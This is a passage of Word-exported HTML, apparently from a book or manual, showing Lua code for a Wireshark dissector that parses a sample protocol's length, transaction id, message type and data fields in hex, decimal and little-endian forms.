New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Data")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_addata = ProtoField.string("sample.addata",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"AddData", "This is Additional Data")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_addata_b = ProtoField.bytes("sample.addata_b", "AddData_bytes",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX, nil, nil, "This is Additional data as bytes")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add fields to our protocol</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section354" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sample_proto.fields = { f_len_h,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:208.7000pt;margin-left:180.6500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >f_len_d, f_transid_h, f_transid_d, f_msgtype_s, f_msgtype_uh, f_msgtype_ud, f_msgdata, f_addata, f_addata_b}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create our dissector</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function sample_proto.dissector (buf, pinfo, tree)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--set name as it shows up in the protocol column pinfo.cols.protocol = sample_proto.name</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--our pretty delimeter</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local delim = "===================="</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create the subtree object so we can add off of the Sample Protocol</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local subtree = tree:add(sample_proto, buf(0))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create a nest for just the length field</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ln_tree = subtree:add(buf(0, 2), "Length Fields")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add treeitem without using protofield ln_tree:add(buf(0, 2), "Length: " .. buf(0,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2):uint()):append_text("\t[*] add without ProtoField -- uint")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:75.4500pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add treeitem without specifying endianess in both hex and int/decimal</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ln_tree:add(f_len_d, buf(0, 2)):append_text("\t[*] add</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >with ProtoField</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.DEC")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ln_tree:add(f_len_h, buf(0, 2)):append_text("\t[*] add</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >with ProtoField</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ln_tree:add_le(f_len_h, buf(0, 2)):append_text("\t[*]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >add_le with</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField base.HEX")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add treeitem without using protofield use le_uint() to specify</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >little endian</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ln_tree:add(buf(0, 2), "Length: " .. buf(0, 2)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >:le_uint()):append_text("\t[*] add without ProtoField -- le_uint")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add treeitem specifying little endian by using add_le ln_tree:add_le(f_len_d, buf(0, 2)):append_text("\t[*]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >add_le</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >with</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField base.DEC")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section355" ><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add the delim</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(buf(2, 1), delim .. "delim" .. delim)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:52.5000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--show the transid as a base.DEC subtree:add(f_transid_d, buf(3, 1)):append_text("\t[*]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField.uint8</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.DEC")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(f_transid_h, buf(3,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1)):append_text("\t[*] ProtoField.uint8</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add the delim</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><a name="_bookmark652" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(buf(4, 1), delim .. "delim" .. delim)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--lets display the msgtype like a string and as a uint both hex and</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  